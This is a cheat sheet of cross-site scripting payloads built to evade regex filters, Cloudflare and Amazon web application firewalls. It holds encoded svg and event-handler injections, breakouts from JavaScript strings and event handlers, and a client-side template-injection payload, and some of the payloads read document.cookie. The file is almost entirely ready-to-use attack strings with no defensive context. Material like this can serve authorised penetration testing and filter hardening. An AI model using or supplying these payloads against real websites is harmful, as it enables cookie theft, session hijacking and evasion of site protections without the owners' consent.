
Regex Filter BYpass:
====================
	==""><h1 onclick=alert`1`

	""><img src=x onload=alert(1)>


Cloudflare Fileter Bypass:
==========================

	<Svg Only=1 OnLoad=confirm(1)>
	"><svg+svg+svg\/\/On+OnLoAd=confirm(1)>
	"><svg/onload=alert(1)>
	"><svg/on/onload=alert(1)>
	“><sv\u01234\g\u01235/on\u01236load=confirm(1)>
	"><sv\u01234\g+s\01235\vg...
	"><sv\u01234\g+s\01235\vg+\01236\svg
	\u01237\/ ----> \/\u01237\/\ ----> /\u01237\/ ----> /
	On\u01234\load ----> On\u01234\+OnLoAd ----> onload
	"\/><img%20s+src+c=x%20on+onerror+%20="alert(1)"\>
	“%3E%3Csvg onmouseover%3d”confirm(1"/%3E
	%22%3E%3Csvg%20onmouseover%3d%22confirm%26%230000000040document.domain)
	hello<svg on onload=(alert)(document.cookie)>
	%2522%2520onmouseover%253D%2522alert%25281%252 - ["onmouseover="alert(1)] double urlencode
	<svg onload=alert%26%230000000040"1")>
	
	AMAZON WAF BYPASS


          "><D3V%0aONPoiNtERENTEr%0d=%0d[document.cookie].find(confirm)%0dx>

         WAF bypass :

         <x/onclick=globalThis&lsqb;'\u0070r\u006f'+'mpt']&lt;)>clickme




	

	


Other Bypass Techniques:
=======================
	When [">,alert] is filter/blocked use this:
	"autofocus+onfocus%3D"%26%230000106%26%230000097%26%230000118%26%230000097%26%230000115%26%230000099%26%230000114%26%230000105%26%230000112%26%230000116%26%230000058%26%230000097%26%230000108%26%230000101%26%230000114%26%230000116%26%230000040%26%230000039%26%230000088%26%230000083%26%230000083%26%230000039%26%230000041#

2-  Inside javascript val = ''

			'-alert(1)-'
	Inside Javascript string - filter single quote and backslach escaped
	
			\';alert(1);<!--

3-	Filter Inside Event handler:

		%26apos;);alert(1)//

4-  Double quote delimiter: filter only >  

		"autofocus%20onfocus="alert(1)

	Single quote delimiter: >

		'autofocus onfocus='alert(1)

	Stored XSS - 

	{{constructor.constructor('alert('XSS')')()}}    - For more check out: HackTricks - CSTI 


